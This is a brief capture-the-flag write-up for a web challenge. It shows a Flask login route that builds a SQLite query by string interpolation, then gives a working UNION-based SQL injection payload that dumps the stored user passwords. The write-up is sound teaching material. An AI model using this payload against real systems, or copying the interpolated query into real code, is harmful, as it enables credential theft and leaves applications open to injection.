Writeup by Colin

No clue how this is hardest one in Webexp.

We exploit this function:

```python
@app.route('/login_username', methods=['POST'])
def login():
    username = request.form['username']
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    user_info = c.execute(f"SELECT username FROM users WHERE username='{username}'").fetchall()
    if not user_info:
        flash('Who are you?', 'error')
    else:
        flash(f'Welcome back, {user_info}', 'success')
    return render_template('index.html')
```

So we inject stuff here:
```sql
SELECT username FROM users WHERE username='{username}'
```

`c.execute` doesn't allow multiple statements at once, so doing something trivial like
```sql
SELECT username FROM users WHERE username='a'; select password from users; --'
```
doesn't work.
However, SQL has a [union operator](https://www.programiz.com/sql/union) that we can use:
```sql
SELECT username FROM users WHERE username='a' union select password from users where '1' = '1'
```

Entering `a' union select password from users where '1' = '1` into the form gives us the passwords of the users, which are chunks of the flag.

